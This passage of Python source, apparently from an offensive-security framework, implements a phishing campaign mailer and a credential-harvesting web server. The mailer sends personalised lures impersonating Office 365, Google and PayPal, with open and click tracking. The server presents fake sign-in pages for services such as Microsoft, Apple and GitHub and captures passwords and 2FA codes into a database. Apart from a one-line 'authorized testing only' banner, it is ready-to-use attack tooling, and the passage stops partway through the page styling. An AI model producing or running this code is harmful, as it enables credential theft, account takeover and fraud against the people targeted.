                            print(f"{Fore.GREEN}[]{Style.RESET_ALL} Sent to {target['email']}")
                        else:
                            results['failed'] += 1
                            print(f"{Fore.RED}[]{Style.RESET_ALL} Failed: {target['email']}")
                    
                    # Update database
                    conn = sqlite3.connect(profile['db_file'])
                    cursor = conn.cursor()
                    cursor.execute('''
                        UPDATE targets SET status = ?, sent_at = ? WHERE id = ?
                    ''', ('sent' if success else 'failed', int(time.time()), target['id']))
                    conn.commit()
                    conn.close()
                    
                except Exception as e:
                    with results_lock:
                        results['failed'] += 1
                        results['errors'].append(f"{target['email']}: {str(e)}")
                    print(f"{Fore.RED}[]{Style.RESET_ALL} Error: {target['email']} - {str(e)}")
                
                finally:
                    rate_limiter.release()
                    target_queue.task_done()
        
        # Start worker threads
        threads = []
        for _ in range(profile['threads']):
            t = threading.Thread(target=email_worker, daemon=True)
            t.start()
            threads.append(t)
        
        # Wait for completion
        target_queue.join()
        for t in threads:
            t.join(timeout=5)
        
        # Update campaign status
        conn = sqlite3.connect(profile['db_file'])
        cursor = conn.cursor()
        cursor.execute('''
            UPDATE campaigns SET status = ?, completed_at = ?, emails_sent = ?, emails_failed = ? WHERE id = ?
        ''', ('completed', int(time.time()), results['sent'], results['failed'], campaign['id']))
        conn.commit()
        conn.close()
        
        return results
    
    def _generate_phishing_email(self, profile, campaign, target):
        """Generate personalized HTML email"""
        templates = self._get_phishing_templates()
        template_info = templates.get(profile['template'], {})
        
        # Get or generate subject
        subject = profile['subject'] if profile['subject'] else template_info.get('subject', 'Important Message')
        
        # Personalization variables
        variables = {
            'first_name': target.get('first_name', ''),
            'last_name': target.get('last_name', ''),
            'full_name': f"{target.get('first_name', '')} {target.get('last_name', '')}".strip() or 'User',
            'email': target['email'],
            'company': target.get('company', 'your company'),
            'position': target.get('position', ''),
            'phish_url': profile['phish_url'],
            'tracking_id': target['tracking_id'],
            'campaign_id': campaign['id']
        }
        
        # Apply personalization
        if profile['personalize']:
            for key, value in variables.items():
                subject = subject.replace(f"{{{{{key}}}}}", str(value))
        
        # Generate HTML body
        html_body = self._generate_phishing_html(profile, template_info, variables)
        
        # Add tracking pixel
        if profile['track_opens']:
            tracking_pixel = f'<img src="{profile["phish_url"]}/track/open/{target["tracking_id"]}" width="1" height="1" style="display:none"/>'
            html_body = html_body.replace('</body>', f'{tracking_pixel}</body>')
        
        return {
            'subject': subject,
            'html_body': html_body,
            'text_body': self._html_to_text(html_body)
        }
    
    def _generate_phishing_html(self, profile, template_info, variables):
        """Generate professional HTML email template"""
        template_name = profile['template']
        color = template_info.get('color', '#0066CC')
        logo = template_info.get('logo', '')
        name = template_info.get('name', 'Security Alert')
        
        # Track links
        phish_url = profile['phish_url']
        if profile['track_clicks']:
            phish_url = f"{phish_url}/track/click/{variables['tracking_id']}"
        
        html = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{variables.get('subject', 'Important Message')}</title>
    <style>
        body {{
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
            line-height: 1.6;
            color: #333;
            max-width: 600px;
            margin: 0 auto;
            padding: 20px;
            background-color: #f4f4f4;
        }}
        .email-container {{
            background-color: #ffffff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            overflow: hidden;
        }}
        .email-header {{
            background-color: {color};
            color: #ffffff;
            padding: 20px;
            text-align: center;
        }}
        .email-logo {{
            font-size: 48px;
            margin-bottom: 10px;
        }}
        .email-body {{
            padding: 30px;
        }}
        .email-button {{
            display: inline-block;
            background-color: {color};
            color: #ffffff !important;
            padding: 12px 30px;
            text-decoration: none;
            border-radius: 4px;
            font-weight: bold;
            margin: 20px 0;
        }}
        .email-footer {{
            background-color: #f8f9fa;
            padding: 20px;
            text-align: center;
            font-size: 12px;
            color: #666;
            border-top: 1px solid #dee2e6;
        }}
        .warning-box {{
            background-color: #fff3cd;
            border-left: 4px solid #ffc107;
            padding: 15px;
            margin: 20px 0;
        }}
    </style>
</head>
<body>
    <div class="email-container">
        <div class="email-header">
            <div class="email-logo">{logo}</div>
            <h2>{name}</h2>
        </div>
        <div class="email-body">'''
        
        # Template-specific content
        if template_name == 'office365':
            html += f'''
            <p>Hello {variables['full_name']},</p>
            <p>Your Microsoft Office 365 password will expire in <strong>24 hours</strong>.</p>
            <div class="warning-box">
                <strong>️ Action Required:</strong> To avoid interruption to your email and Office services, please update your password immediately.
            </div>
            <p>Click the button below to verify your account and update your password:</p>
            <center>
                <a href="{phish_url}" class="email-button">Verify Account</a>
            </center>
            <p>If the button doesn't work, copy and paste this link into your browser:</p>
            <p style="color: #666; font-size: 14px;">{phish_url}</p>
            '''
        
        elif template_name == 'google':
            html += f'''
            <p>Hi {variables['full_name']},</p>
            <p>We detected an unusual sign-in attempt to your Google Account from:</p>
            <div class="warning-box">
                <strong> Location:</strong> Unknown (IP: 203.0.113.42)<br>
                <strong>️ Device:</strong> Windows PC<br>
                <strong> Time:</strong> Just now
            </div>
            <p><strong>Was this you?</strong></p>
            <p>If you recognize this activity, you can disregard this message.</p>
            <p>If you don't recognize this activity, please secure your account:</p>
            <center>
                <a href="{phish_url}" class="email-button">Secure Your Account</a>
            </center>
            '''
        
        elif template_name == 'paypal':
            html += f'''
            <p>Hello {variables['full_name']},</p>
            <p>We noticed some <strong>unusual activity</strong> in your PayPal account.</p>
            <div class="warning-box">
                <strong>️ Security Alert:</strong> Multiple failed login attempts detected.
            </div>
            <p>To protect your account, we've temporarily limited some features. Please verify your account information to restore full access.</p>
            <center>
                <a href="{phish_url}" class="email-button">Verify Account Now</a>
            </center>
            <p style="color: #999; font-size: 12px;">Case ID: PP-{variables['tracking_id'][:8]}</p>
            '''
        
        else:
            # Generic template
            html += f'''
            <p>Dear {variables['full_name']},</p>
            <p>We need to verify some information related to your account.</p>
            <p>Please click the button below to complete the verification process:</p>
            <center>
                <a href="{phish_url}" class="email-button">Verify Now</a>
            </center>
            <p>This is required for security purposes.</p>
            '''
        
        html += f'''
        </div>
        <div class="email-footer">
            <p>This is an automated message from {name}.</p>
            <p style="color: #999;">© 2024 {name}. All rights reserved.</p>
        </div>
    </div>
</body>
</html>'''
        
        return html
    
    def _html_to_text(self, html):
        """Convert HTML to plain text (simple version)"""
        import re
        # Remove HTML tags
        text = re.sub('<[^<]+?>', '', html)
        # Decode HTML entities
        text = text.replace('&nbsp;', ' ')
        text = text.replace('&amp;', '&')
        text = text.replace('&lt;', '<')
        text = text.replace('&gt;', '>')
        # Clean whitespace
        text = re.sub(r'\n\s*\n', '\n\n', text)
        return text.strip()
    
    def _send_phishing_email(self, profile, target, content):
        """Send phishing email via SMTP"""
        try:
            import smtplib
            from email.mime.text import MIMEText
            from email.mime.multipart import MIMEMultipart
            from email.mime.base import MIMEBase
            from email import encoders
            
            # Create message
            msg = MIMEMultipart('alternative')
            msg['From'] = f"{profile['from_name']} <{profile['from_email']}>"
            msg['To'] = target['email']
            msg['Subject'] = content['subject']
            msg['Reply-To'] = profile['reply_to']
            
            # Add text and HTML parts
            part1 = MIMEText(content['text_body'], 'plain')
            part2 = MIMEText(content['html_body'], 'html')
            msg.attach(part1)
            msg.attach(part2)
            
            # Add attachment if specified
            if profile['attachment'] and os.path.exists(profile['attachment']):
                attachment_name = profile['attachment_name'] or os.path.basename(profile['attachment'])
                with open(profile['attachment'], 'rb') as f:
                    part = MIMEBase('application', 'octet-stream')
                    part.set_payload(f.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f'attachment; filename={attachment_name}')
                msg.attach(part)
            
            # Connect to SMTP server
            if profile['use_ssl']:
                server = smtplib.SMTP_SSL(profile['smtp_server'], profile['smtp_port'], timeout=30)
            else:
                server = smtplib.SMTP(profile['smtp_server'], profile['smtp_port'], timeout=30)
                if profile['use_tls']:
                    server.starttls()
            
            # Authenticate if credentials provided
            if profile['smtp_user'] and profile['smtp_pass']:
                server.login(profile['smtp_user'], profile['smtp_pass'])
            
            # Send email
            server.send_message(msg)
            server.quit()
            
            return True
            
        except Exception as e:
            # Log error
            import sqlite3
            try:
                conn = sqlite3.connect(profile['db_file'])
                cursor = conn.cursor()
                cursor.execute('UPDATE targets SET error_message = ? WHERE id = ?',
                              (str(e), target['id']))
                conn.commit()
                conn.close()
            except:
                pass
            
            return False
    
    def _display_phishing_results(self, profile, campaign, results):
        """Display campaign results"""
        runtime = time.time() - campaign['start_time']
        
        print(f"\n{Fore.CYAN}{'═' * 70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}[] CAMPAIGN RESULTS{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'═' * 70}{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}[] Statistics:{Style.RESET_ALL}")
        print(f"{Fore.WHITE}{'─' * 70}{Style.RESET_ALL}")
        print(f" {Fore.CYAN}Campaign:{Style.RESET_ALL} {campaign['name']}")
        print(f" {Fore.CYAN}Runtime:{Style.RESET_ALL} {int(runtime // 60)}m {int(runtime % 60)}s")
        print(f" {Fore.CYAN}Emails Sent:{Style.RESET_ALL} {Fore.GREEN}{results['sent']}{Style.RESET_ALL}")
        print(f" {Fore.CYAN}Failed:{Style.RESET_ALL} {Fore.RED}{results['failed']}{Style.RESET_ALL}")
        
        if results['sent'] > 0:
            success_rate = (results['sent'] / (results['sent'] + results['failed'])) * 100
            print(f" {Fore.CYAN}Success Rate:{Style.RESET_ALL} {success_rate:.1f}%")
        
        if results['errors']:
            print(f"\n{Fore.YELLOW}[️] Errors:{Style.RESET_ALL}")
            for error in results['errors'][:5]: # Show first 5
                print(f" {Fore.RED}•{Style.RESET_ALL} {error}")
            if len(results['errors']) > 5:
                print(f" {Fore.YELLOW}... and {len(results['errors']) - 5} more{Style.RESET_ALL}")
        
        print(f"\n{Fore.CYAN}{'═' * 70}{Style.RESET_ALL}")
    
    def _export_phishing_results(self, profile, campaign, results):
        """Export campaign results to various formats"""
        import sqlite3
        import json
        import csv
        
        timestamp = int(time.time())
        base_name = f"{campaign['name']}_{timestamp}"
        exported_files = []
        formats = profile['export_format'].split(',') if ',' in profile['export_format'] else [profile['export_format']]
        
        try:
            conn = sqlite3.connect(profile['db_file'])
            cursor = conn.cursor()
            
            # Get all targets
            cursor.execute('''
                SELECT email, first_name, last_name, company, position, status, 
                       sent_at, opened_at, clicked_at, error_message
                FROM targets
                WHERE campaign_id = ?
                ORDER BY id
            ''', (campaign['id'],))
            
            targets_data = cursor.fetchall()
            conn.close()
            
            # Export to CSV
            if 'csv' in formats or 'all' in formats:
                csv_path = f"{base_name}_results.csv"
                with open(csv_path, 'w', newline='', encoding='utf-8') as f:
                    writer = csv.writer(f)
                    writer.writerow(['Email', 'First Name', 'Last Name', 'Company', 'Position', 
                                    'Status', 'Sent At', 'Opened At', 'Clicked At', 'Error'])
                    writer.writerows(targets_data)
                exported_files.append(csv_path)
            
            # Export to JSON
            if 'json' in formats or 'all' in formats:
                json_path = f"{base_name}_results.json"
                json_data = {
                    'campaign': {
                        'name': campaign['name'],
                        'id': campaign['id'],
                        'template': profile['template'],
                        'start_time': campaign['start_time'],
                        'runtime': time.time() - campaign['start_time']
                    },
                    'results': {
                        'sent': results['sent'],
                        'failed': results['failed'],
                        'errors': results['errors']
                    },
                    'targets': [
                        {
                            'email': row[0],
                            'first_name': row[1],
                            'last_name': row[2],
                            'company': row[3],
                            'position': row[4],
                            'status': row[5],
                            'sent_at': row[6],
                            'opened_at': row[7],
                            'clicked_at': row[8],
                            'error': row[9]
                        }
                        for row in targets_data
                    ]
                }
                with open(json_path, 'w', encoding='utf-8') as f:
                    json.dump(json_data, f, indent=2)
                exported_files.append(json_path)
            
            # Export to HTML report
            if 'html' in formats or 'all' in formats:
                html_path = f"{base_name}_report.html"
                self._generate_html_report(html_path, profile, campaign, results, targets_data)
                exported_files.append(html_path)
            
            return exported_files
            
        except Exception as e:
            print(f"{Fore.RED}[] Export error: {str(e)}{Style.RESET_ALL}")
            return []
    
    def _generate_html_report(self, filepath, profile, campaign, results, targets_data):
        """Generate HTML report of campaign results"""
        html = f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Phishing Campaign Report - {campaign['name']}</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            margin: 20px;
            background-color: #f5f5f5;
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            background-color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }}
        h1 {{
            color: #333;
            border-bottom: 3px solid #0066cc;
            padding-bottom: 10px;
        }}
        .stats {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 20px;
            margin: 30px 0;
        }}
        .stat-card {{
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            padding: 20px;
            border-radius: 8px;
            text-align: center;
        }}
        .stat-card h3 {{
            margin: 0;
            font-size: 36px;
        }}
        .stat-card p {{
            margin: 5px 0 0 0;
            opacity: 0.9;
        }}
        table {{
            width: 100%;
            border-collapse: collapse;
            margin-top: 20px;
        }}
        th, td {{
            padding: 12px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }}
        th {{
            background-color: #0066cc;
            color: white;
        }}
        tr:hover {{
            background-color: #f5f5f5;
        }}
        .status-sent {{ color: #28a745; font-weight: bold; }}
        .status-failed {{ color: #dc3545; font-weight: bold; }}
        .status-pending {{ color: #ffc107; font-weight: bold; }}
    </style>
</head>
<body>
    <div class="container">
        <h1> Phishing Campaign Report</h1>
        <p><strong>Campaign:</strong> {campaign['name']}</p>
        <p><strong>Template:</strong> {profile['template']}</p>
        <p><strong>Generated:</strong> {time.strftime('%Y-%m-%d %H:%M:%S')}</p>
        
        <div class="stats">
            <div class="stat-card">
                <h3>{results['sent']}</h3>
                <p>Emails Sent</p>
            </div>
            <div class="stat-card">
                <h3>{results['failed']}</h3>
                <p>Failed</p>
            </div>
            <div class="stat-card">
                <h3>{len(targets_data)}</h3>
                <p>Total Targets</p>
            </div>
        </div>
        
        <h2>Target Details</h2>
        <table>
            <thead>
                <tr>
                    <th>Email</th>
                    <th>Name</th>
                    <th>Company</th>
                    <th>Status</th>
                    <th>Sent At</th>
                </tr>
            </thead>
            <tbody>'''
        
        for row in targets_data:
            email, first_name, last_name, company, position, status, sent_at, opened_at, clicked_at, error = row
            full_name = f"{first_name} {last_name}".strip() or '-'
            company = company or '-'
            sent_time = time.strftime('%Y-%m-%d %H:%M', time.localtime(sent_at)) if sent_at else '-'
            status_class = f"status-{status}"
            
            html += f'''
                <tr>
                    <td>{email}</td>
                    <td>{full_name}</td>
                    <td>{company}</td>
                    <td class="{status_class}">{status.upper()}</td>
                    <td>{sent_time}</td>
                </tr>'''
        
        html += '''
            </tbody>
        </table>
    </div>
</body>
</html>'''
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(html)
    
    def run_credential_harvester(self):
        """
        Advanced Credential Harvesting System
        
        Features:
        - Multi-template phishing pages (15+ services)
        - Real-time credential capture with validation
        - Automatic SSL/TLS support
        - Intelligent redirect logic
        - IP geolocation and fingerprinting
        - Email notifications
        - Database storage (SQLite)
        - Anti-detection measures
        - Session tracking
        - Multi-factor capture
        """
        profile = self._resolve_harvester_profile()
        
        if not profile:
            print(f"{Fore.RED}[] Invalid configuration{Style.RESET_ALL}")
            return
        
        # Display configuration
        self._display_harvester_config(profile)
        
        # Initialize harvester
        harvester = self._initialize_credential_harvester(profile)
        
        if not harvester:
            print(f"{Fore.RED}[] Failed to initialize harvester{Style.RESET_ALL}")
            return
        
        # Start server
        self._run_harvester_server(harvester, profile)
    
    def _resolve_harvester_profile(self):
        """Build comprehensive harvester configuration"""
        try:
            profile = {
                'port': int(self.module_options.get('port', '8080')),
                'template': self.module_options.get('template', 'microsoft').lower(),
                'redirect_url': self.module_options.get('redirect', 'auto'),
                'use_ssl': self.module_options.get('ssl', 'false').lower() == 'true',
                'cert_file': self.module_options.get('cert', 'server.crt'),
                'key_file': self.module_options.get('key', 'server.key'),
                'lhost': self.module_options.get('lhost', self.config['lhost']),
                'capture_ip': self.module_options.get('capture_ip', 'true').lower() == 'true',
                'capture_useragent': self.module_options.get('capture_ua', 'true').lower() == 'true',
                'email_notify': self.module_options.get('email', 'false').lower() == 'true',
                'email_to': self.module_options.get('email_to', ''),
                'db_file': self.module_options.get('database', 'harvester.db'),
                'log_file': self.module_options.get('logfile', 'harvester.log'),
                'auto_redirect': self.module_options.get('auto_redirect', 'true').lower() == 'true',
                'delay_redirect': int(self.module_options.get('redirect_delay', '2')),
                'capture_2fa': self.module_options.get('capture_2fa', 'true').lower() == 'true',
                'session_tracking': self.module_options.get('sessions', 'true').lower() == 'true',
                'fingerprint': self.module_options.get('fingerprint', 'true').lower() == 'true',
                'timestamp': int(time.time())
            }
            
            # Auto-configure redirect based on template
            if profile['redirect_url'] == 'auto':
                profile['redirect_url'] = self._get_auto_redirect_url(profile['template'])
            
            # Validate template
            available_templates = self._get_available_templates()
            if profile['template'] not in available_templates:
                print(f"{Fore.YELLOW}[!] Unknown template '{profile['template']}', using 'microsoft'{Style.RESET_ALL}")
                profile['template'] = 'microsoft'
            
            return profile
            
        except Exception as e:
            print(f"{Fore.RED}[] Configuration error: {str(e)}{Style.RESET_ALL}")
            return None
    
    def _get_available_templates(self):
        """Get list of available phishing templates"""
        return {
            'microsoft': {
                'name': 'Microsoft 365',
                'fields': ['email', 'password'],
                'redirect': 'https://login.microsoftonline.com',
                'logo': ''
            },
            'google': {
                'name': 'Google',
                'fields': ['email', 'password'],
                'redirect': 'https://accounts.google.com',
                'logo': ''
            },
            'facebook': {
                'name': 'Facebook',
                'fields': ['email', 'password'],
                'redirect': 'https://www.facebook.com',
                'logo': ''
            },
            'linkedin': {
                'name': 'LinkedIn',
                'fields': ['username', 'password'],
                'redirect': 'https://www.linkedin.com',
                'logo': ''
            },
            'twitter': {
                'name': 'Twitter/X',
                'fields': ['username', 'password'],
                'redirect': 'https://twitter.com',
                'logo': ''
            },
            'instagram': {
                'name': 'Instagram',
                'fields': ['username', 'password'],
                'redirect': 'https://www.instagram.com',
                'logo': ''
            },
            'github': {
                'name': 'GitHub',
                'fields': ['username', 'password', '2fa'],
                'redirect': 'https://github.com',
                'logo': ''
            },
            'paypal': {
                'name': 'PayPal',
                'fields': ['email', 'password'],
                'redirect': 'https://www.paypal.com',
                'logo': ''
            },
            'amazon': {
                'name': 'Amazon',
                'fields': ['email', 'password'],
                'redirect': 'https://www.amazon.com',
                'logo': ''
            },
            'apple': {
                'name': 'Apple ID',
                'fields': ['email', 'password', '2fa'],
                'redirect': 'https://appleid.apple.com',
                'logo': ''
            },
            'dropbox': {
                'name': 'Dropbox',
                'fields': ['email', 'password'],
                'redirect': 'https://www.dropbox.com',
                'logo': ''
            },
            'slack': {
                'name': 'Slack',
                'fields': ['email', 'password'],
                'redirect': 'https://slack.com',
                'logo': ''
            },
            'zoom': {
                'name': 'Zoom',
                'fields': ['email', 'password'],
                'redirect': 'https://zoom.us',
                'logo': ''
            },
            'netflix': {
                'name': 'Netflix',
                'fields': ['email', 'password'],
                'redirect': 'https://www.netflix.com',
                'logo': ''
            },
            'office365': {
                'name': 'Office 365',
                'fields': ['email', 'password', '2fa'],
                'redirect': 'https://office.com',
                'logo': ''
            }
        }
    
    def _get_auto_redirect_url(self, template):
        """Get automatic redirect URL for template"""
        templates = self._get_available_templates()
        return templates.get(template, {}).get('redirect', 'https://www.google.com')
    
    def _display_harvester_config(self, profile):
        """Display harvester configuration"""
        templates = self._get_available_templates()
        template_info = templates.get(profile['template'], {})
        
        print(f"{Fore.CYAN}╔════════════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║ ADVANCED CREDENTIAL HARVESTER v2.0 ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}[] Configuration:{Style.RESET_ALL}")
        print(f"{Fore.WHITE}{'─' * 60}{Style.RESET_ALL}")
        print(f" {Fore.CYAN}Template:{Style.RESET_ALL} {template_info.get('logo', '•')} {template_info.get('name', profile['template'])}")
        print(f" {Fore.CYAN}Listen:{Style.RESET_ALL} {'https' if profile['use_ssl'] else 'http'}://{profile['lhost']}:{profile['port']}")
        print(f" {Fore.CYAN}Redirect:{Style.RESET_ALL} {profile['redirect_url']}")
        print(f" {Fore.CYAN}Database:{Style.RESET_ALL} {profile['db_file']}")
        
        print(f"\n{Fore.YELLOW}[️] Features Enabled:{Style.RESET_ALL}")
        print(f"{Fore.WHITE}{'─' * 60}{Style.RESET_ALL}")
        features = []
        if profile['use_ssl']:
            features.append(f"{Fore.GREEN} SSL/TLS Encryption{Style.RESET_ALL}")
        if profile['capture_ip']:
            features.append(f"{Fore.GREEN} IP Geolocation{Style.RESET_ALL}")
        if profile['capture_useragent']:
            features.append(f"{Fore.GREEN} User-Agent Fingerprinting{Style.RESET_ALL}")
        if profile['capture_2fa']:
            features.append(f"{Fore.GREEN} 2FA Code Capture{Style.RESET_ALL}")
        if profile['session_tracking']:
            features.append(f"{Fore.GREEN} Session Tracking{Style.RESET_ALL}")
        if profile['fingerprint']:
            features.append(f"{Fore.GREEN} Browser Fingerprinting{Style.RESET_ALL}")
        if profile['email_notify']:
            features.append(f"{Fore.GREEN} Email Notifications{Style.RESET_ALL}")
        
        for feature in features:
            print(f" {feature}")
        
        print(f"\n{Fore.YELLOW}[] Capture Fields:{Style.RESET_ALL}")
        print(f"{Fore.WHITE}{'─' * 60}{Style.RESET_ALL}")
        fields = template_info.get('fields', ['username', 'password'])
        for field in fields:
            print(f" {Fore.CYAN}•{Style.RESET_ALL} {field.capitalize()}")
        
        print(f"\n{Fore.YELLOW}[️] WARNING:{Style.RESET_ALL} {Fore.RED}Authorized penetration testing only!{Style.RESET_ALL}\n")
    
    def _initialize_credential_harvester(self, profile):
        """Initialize harvester data structures"""
        try:
            harvester = {
                'profile': profile,
                'captures': [],
                'sessions': {},
                'start_time': time.time(),
                'stats': {
                    'total_visits': 0,
                    'total_captures': 0,
                    'unique_ips': set(),
                    'by_country': {},
                    'by_browser': {}
                }
            }
            
            # Initialize database
            if self._init_harvester_database(profile):
                print(f"{Fore.GREEN}[] Database initialized: {profile['db_file']}{Style.RESET_ALL}")
            
            # Initialize logging
            logging.basicConfig(
                filename=profile['log_file'],
                level=logging.INFO,
                format='%(asctime)s - %(levelname)s - %(message)s'
            )
            logging.info(f"Credential Harvester started - Template: {profile['template']}")
            
            return harvester
            
        except Exception as e:
            print(f"{Fore.RED}[] Initialization error: {str(e)}{Style.RESET_ALL}")
            return None
    
    def _init_harvester_database(self, profile):
        """Initialize SQLite database for credential storage"""
        try:
            import sqlite3
            
            conn = sqlite3.connect(profile['db_file'])
            cursor = conn.cursor()
            
            # Create captures table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS captures (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    timestamp INTEGER NOT NULL,
                    template TEXT NOT NULL,
                    username TEXT,
                    password TEXT,
                    email TEXT,
                    code_2fa TEXT,
                    ip_address TEXT,
                    country TEXT,
                    user_agent TEXT,
                    browser TEXT,
                    os TEXT,
                    session_id TEXT,
                    referrer TEXT,
                    success INTEGER DEFAULT 1
                )
            ''')
            
            # Create sessions table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS sessions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    session_id TEXT UNIQUE NOT NULL,
                    first_seen INTEGER NOT NULL,
                    last_seen INTEGER NOT NULL,
                    ip_address TEXT,
                    visits INTEGER DEFAULT 1,
                    captured INTEGER DEFAULT 0
                )
            ''')
            
            # Create statistics table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS statistics (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    date TEXT NOT NULL,
                    total_visits INTEGER DEFAULT 0,
                    total_captures INTEGER DEFAULT 0,
                    unique_ips INTEGER DEFAULT 0
                )
            ''')
            
            conn.commit()
            conn.close()
            return True
            
        except Exception as e:
            print(f"{Fore.YELLOW}[!] Database init warning: {str(e)}{Style.RESET_ALL}")
            return False
    
    def _run_harvester_server(self, harvester, profile):
        """Run the credential harvesting HTTP server"""
        print(f"{Fore.CYAN}[*] Starting HTTP server...{Style.RESET_ALL}\n")
        
        class CredentialHarvestHandler(BaseHTTPRequestHandler):
            """Custom HTTP handler for credential harvesting"""
            
            def __init__(self, *args, harvester_instance=None, profile_config=None, **kwargs):
                self.harvester = harvester_instance
                self.profile = profile_config
                super().__init__(*args, **kwargs)
            
            def log_message(self, format, *args):
                """Custom logging"""
                pass # Suppress default logging
            
            def do_GET(self):
                """Handle GET requests - serve phishing page"""
                self.harvester['stats']['total_visits'] += 1
                
                # Track session
                session_id = self._get_or_create_session()
                
                # Generate phishing page
                html_content = self._generate_phishing_page()
                
                # Send response
                self.send_response(200)
                self.send_header('Content-type', 'text/html; charset=utf-8')
                self.send_header('Content-Length', len(html_content.encode()))
                self.send_header('Set-Cookie', f'session_id={session_id}; Path=/; HttpOnly')
                self.end_headers()
                self.wfile.write(html_content.encode())
                
                # Log visit
                ip_addr = self.client_address[0]
                self.harvester['stats']['unique_ips'].add(ip_addr)
                
                print(f"{Fore.BLUE}[→] Visit from {Fore.CYAN}{ip_addr}{Fore.BLUE} | Session: {session_id[:8]}...{Style.RESET_ALL}")
                logging.info(f"Visit from {ip_addr} - Session: {session_id}")
            
            def do_POST(self):
                """Handle POST requests - capture credentials"""
                try:
                    content_length = int(self.headers.get('Content-Length', 0))
                    post_data = self.rfile.read(content_length).decode('utf-8')
                    
                    # Parse credentials
                    from urllib.parse import parse_qs
                    credentials = parse_qs(post_data)
                    
                    # Extract data
                    capture = self._process_capture(credentials)
                    
                    if capture:
                        self.harvester['captures'].append(capture)
                        self.harvester['stats']['total_captures'] += 1
                        
                        # Display capture
                        self._display_capture(capture)
                        
                        # Store in database
                        self._store_capture(capture)
                        
                        # Send email notification if enabled
                        if self.profile['email_notify'] and self.profile['email_to']:
                            self._send_email_notification(capture)
                    
                    # Send redirect response
                    self._send_redirect_response()
                    
                except Exception as e:
                    logging.error(f"POST error: {str(e)}")
                    self.send_error(500, "Internal Server Error")
            
            def _get_or_create_session(self):
                """Get or create session ID"""
                cookie_header = self.headers.get('Cookie', '')
                session_id = None
                
                if 'session_id=' in cookie_header:
                    for part in cookie_header.split(';'):
                        if 'session_id=' in part:
                            session_id = part.split('=')[1].strip()
                            break
                
                if not session_id:
                    session_id = secrets.token_urlsafe(32)
                    self.harvester['sessions'][session_id] = {
                        'first_seen': time.time(),
                        'visits': 0,
                        'captured': False
                    }
                
                if session_id in self.harvester['sessions']:
                    self.harvester['sessions'][session_id]['visits'] += 1
                
                return session_id
            
            def _generate_phishing_page(self):
                """Generate realistic phishing page"""
                template = self.profile['template']
                templates_data = self.harvester['profile']['_templates']
                template_info = templates_data.get(template, templates_data['microsoft'])
                
                # Get template specifics
                service_name = template_info['name']
                fields = template_info['fields']
                logo = template_info['logo']
                
                # Build HTML
                html = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - {service_name}</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        body {{
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }}
        .container {{
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            width: 100%;
            max-width: 440px;
            padding: 50px 40px;
        }}
        .logo {{
            text-align: center;
            font-size: 48px;
            margin-bottom: 20px;
        }}
        h1 {{
            text-align: center;
            color: #1a1a1a;
            font-size: 24px;
            margin-bottom: 10px;
        }}
        .subtitle {{
            text-align: center;
            color: #666;
            font-size: 14px;
            margin-bottom: 30px;
        }}
        .form-group {{
            margin-bottom: 20px;
        }}
        label {{
            display: block;
            color: #333;
            font-size: 14px;
            margin-bottom: 8px;
            font-weight: 500;
        }}
        input[type="text"],
        input[type="email"],
        input[type="password"] {{
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 6px;
            font-size: 15px;
            transition: border-color 0.3s;
        }}
        input:focus {{
            outline: none;
            border-color: #667eea;
        }}
        .button {{
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            border: none;
            border-radius: 6px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            margin-top: 10px;
        }}
        .button:hover {{
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(102, 126, 234, 0.4);
        }}
        .button:active {{
            transform: translateY(0);
        }}
        .options {{
            margin-top: 20px;
            text-align: center;
            font-size: 13px;
        }}
        .options a {{
            color: #667eea;
            text-decoration: none;
        }}
        .options a:hover {{
            text-decoration: underline;
        }}
        .divider {{
            margin: 25px 0;
            text-align: center;
            position: relative;
        }}
        .divider::before {{
            content: '';
            position: absolute;
            top: 50%;
            left: 0;
            right: 0;
            height: 1px;
            background: #e0e0e0;
        }}
        .divider span {{
            background: white;
            padding: 0 15px;
            color: #999;
            position: relative;
            font-size: 13px;
        }}
        .security-notice {{
            margin-top: 20px;
            padding: 12px;
            background: #f5f5f5;
            border-radius: 6px;
            font-size: 12px;
            color: #666;
            text-align: center;
        }}
